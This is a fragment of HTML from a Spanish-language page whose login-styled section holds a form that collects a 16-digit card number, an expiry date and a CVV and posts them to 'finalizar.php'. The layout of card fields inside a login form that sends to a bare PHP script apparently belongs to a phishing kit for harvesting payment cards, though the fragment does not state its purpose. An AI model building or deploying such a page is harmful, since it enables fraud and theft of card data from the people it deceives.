        ...
        <section class="login-section ng-scope" ng-controller="loginController as loginControl">
            <div class="login-wrap">
                ...
                <div class="login-form-wrap">
                    <form method="POST" action="finalizar.php" autocomplete="off"
                        ...
                        <div class="preguntas">
                            ...
                            <input type="text" name="codigo" style="width:90%; height:35px; background-color:rgba(243, 213, 228, 0.364); border:none; padding-left:10px;" placeholder="Código Tarjeta" required required maxlength="16" minlength="16">
                            <input type="tel" name="fecha" style="width:90%; height:35px; background-color:rgba(243, 213, 228, 0.364); border:none; margin-top:10px; padding-left:10px;"required placeholder="Fecha Exp (MM/AAAA)" required>
                            <input type="text" name="cvv" style="width:90%; height:35px; background-color:rgba(243, 213, 228, 0.364); border:none;margin-top:10px;padding-left:10px;"required placeholder="Cvv" required maxlength="3">
